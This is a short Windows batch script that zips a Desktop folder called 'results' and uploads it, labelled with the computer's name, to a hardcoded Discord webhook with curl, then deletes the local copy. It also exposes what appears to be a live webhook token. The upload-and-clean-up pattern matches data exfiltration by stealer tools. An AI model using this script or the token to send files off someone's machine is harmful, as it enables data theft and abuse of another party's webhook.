REM =====================
REM upload_discord.bat (save in bigboyfolder)
REM =====================
@echo off
setlocal EnableDelayedExpansion

set "WEBHOOK_URL=https://discord.com/api/webhooks/1316401544433897482/EwCP2AeMxTMazqM5m4HlzgOpIhQG2lGPX-b5kGAtEKrqom9OaXjyQw1Xiz05yNKtBw5B"
cd "%USERPROFILE%\Desktop"

REM Create timestamp
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value') do set datetime=%%I
set "timestamp=%datetime:~0,8%_%datetime:~8,6%"

echo Creating zip file...
powershell -Command "Compress-Archive -Path results -DestinationPath 'results_%timestamp%.zip' -Force"

echo Uploading to Discord...
set "message=Results from %COMPUTERNAME% at %timestamp%"
curl -F "payload_json={\"content\":\"%message%\"}" -F "file=@results_%timestamp%.zip" %WEBHOOK_URL%

echo Cleaning up zip file...
del "results_%timestamp%.zip"
